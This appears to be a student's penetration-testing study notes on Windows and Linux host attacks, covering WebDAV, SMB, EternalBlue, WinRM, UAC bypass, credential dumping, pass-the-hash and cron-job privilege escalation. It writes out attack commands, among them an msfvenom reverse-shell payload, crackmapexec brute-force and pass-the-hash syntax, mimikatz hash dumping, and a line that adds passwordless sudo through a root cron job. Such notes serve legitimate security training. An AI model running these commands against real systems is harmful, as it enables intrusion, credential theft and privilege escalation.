# Host & Network Penetration Testing: System/Host Based Attacks

Intro: system/host based attacks are targeted towards a specific system or host running a specific os

## Windows

### Webdav
**Continue from previous webdav lessons...Uploading msf backdoor to WebDAV**
- msfvenom is to create payload `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > meterpreter.asp
- can also use `iis_webdav_upload` module in the framework instead of `cadaver` which is fully self contain

### SMB with PsExec

- before using psexec, valid credentials are needed, administrator account can be frute force
- brute force module name: `smb_login`
- The `smb/psexec` module in msf will very likely get caught but antivirus
- Manual exploit using psexec.py from impacket, install with `sudo apt install impacket-scripts`

### Eternal Blue MS17-010

What is shellcode?
Shellcode is a small piece of machine-level code (usually written in assembly) that an attacker uses as a payload — it's the code that gets executed once an exploit successfully gains control of a vulnerable process.

- Manual exploit available @ [https://github.com/3ndG4me/AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)

how is shellcode related to MS17
1. The exploit causes a buffer overflow on a vulnerable system.
2. The attacker injects custom shellcode into memory as part of the payload.
3. Once the overflow occurs, the system executes the shellcode — giving you control.


### RDP

- The rdp_scanner module can varify if the port is running rdp
- After confirm, we can brute force the protocol

**BLUEKEEP (CVE-2019-0708)**

- An RDP vulnerability
- msf got both an auxiliary and exploit module for bluekeep (this module only work with 64bit windows, and also need to manually set target)
- Be EXTREMELY careful with kernel exploit, set CHUNK froom size smaller to be a bit gentle to the target machine

### WinRM

- not enabled by default need to be explicitly configured and enabled
- it allows sysadmin just provide username and userpassword/passwordhash to authenticate
- we can perform a bruteforce attack with "crackmapexec" syntax: `crackmapexec <protocol:winrm> <IP> -u <username:admin> -p <password list>
- to execute command with crackmapexec, syntax is: 'crackmapexec <protocol:winrm> <IP> -u <username> -p <password> -x <command to execute>
- to get command shell session we use "evil-winrm"
- msf also has a module: 'winrm_script_exec'
- TIPS: BY DEFAULT NMAP DOES NOT SCAN WINRM PORT 5985-5986

**Note: We are setting the PASSWORD because in the recent version of the "winrm_login" module, the PASSWORD option is required unless using Kerberos authentication. Metasploit will still use the USERPASS_FILE file.**

### Kernel Exploits & Priv Esc for windows

Tools to use:
- Windows-Exploit-Suggester
- Windows-Kernel-Exploits
- In msf, there is a module called `local_exploit_suggester`

**Bypassing UAC with UACMe**

- Requirements: an account that is part of local admin group
- Bypassing will likely not work if it is set to the highest level
- UACMe is developed by @hfire0x and can be downloaded [here](https://github.com/hfiref0x/UACME)
- It works by abusing the inbuilt windows auteelevate tool
- works ranging from win7 to win10

in meterpreter, using pgrep is to grep the process id

UACMe is a very complicated tool, it is recommended to have a home lab with win7, win8,win8.1 and win10 as lab to test all options

**Windows Access Token**





**Alternate Data Streams**

- ADS is an NTFS file attribute and design to be compatible with macOS HFS
- Attackers can use ADS to hide malicious code and executables in legitimate files
- eg: notepad test.txt:secret.txt


**Dumping Password and Hashes**

- Very old version use LM hashes, modern are all NTLM
- All are stored in SAM database and it's locked when the computer is running, thus attacker has to use in-memory techniques to dump SAM hashes from LSASS process
- SAM database is encrypted with a syskey in modern windows
- Elevated/Admin privs are required in order to access and interact with LSASS process
- LM(LanMan) hashes are splited into 2 chunks and hashed with DES algorithm
- NTLM does not split the hash into 2 chunks, also case sensitive unlike LM, but it's not salted, which makes it still quite easy to crack


**Mimikatz**

- It extract hashes from lsass.exe
- msf got mimikatz inside which calls kiwi `load kiwi` to use it
- to run mimikatz locally, the first thing is to check priv `privilege::debug`
- `lsadump::sam` to dump SAM in mimikatz
- Display log on password using `sekurlsa::logonpassword`
**(note that commands in kiwi and mimikatz are different)**

**Pass-The-Hash**

- After capturing hashes or clear-text passwords, we can authenticate it with the target legitimately
- There are many tools to use the pass the hash technique but here we will utilize msf PsExec module and Crackmapexec
- Remember sometimes just the NTLM hash will not work with PsExec module, so they might need the LM hash as well, the format will be `LM:NTLM`
  
- For crackmapexec, we can say `crackmapexec smb <IP> -u <username> -H "NTLM Hash" -x <command>` //no need LM hash here


## Linux

- Frequently Exploited Linux Services: Shellshock, FTP, 


### FTP Exploit

- See if it might have anonymous access
- some versions might be vulnerable
- can brute force it with nmap and hydra (nmap --script @ /usr/share/nmap/scripts)


### SSH Exploit

- ssh auth can be configured in two ways: User & password | Key based auth
- if it is user & password auth then it can be brute force

### SAMBA/SMB Exploit

- SMB is usually used for file sharing, and set up a file share. Thus enumerating shares are very important.
- Brute force with hydra and then use SMBmap and smbclient


### Linux Kernel Exploit

- similar to windows: vulns are usually identified by [linux-Exploit-Suggester]

Steps and Methodology
- After gaining a meterpreter, getuid and sysinfo for standard enum
- TIP: use /bin/bash -i to get a bash instead of using shell (optional)
- cd to /tmp and upload the LES shell script
- chmod the .sh and run it

### Cron Jobs

- Cron is a time-based service that runs applications, scripts etc repeatedly on a specified schedule
- important thing is to target a cronjob that is own and run by root
- Nice shell script to use is `printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > <The location of target shell script that will be executed by the cron job>`










